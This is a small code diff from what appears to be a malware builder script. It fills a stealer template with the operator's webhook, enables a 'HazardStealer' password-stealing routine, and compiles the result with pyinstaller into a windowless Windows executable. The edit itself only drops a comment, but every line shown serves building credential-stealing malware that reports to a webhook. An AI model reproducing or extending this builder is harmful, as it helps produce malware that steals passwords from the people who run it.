@@ -277,7 +277,7 @@ if __name__ == "__main__":
     main()
     if password_stealer:
         HazardStealer()
-""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False")) #100% some way of making this better
+""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False"))
 
         os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py")
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
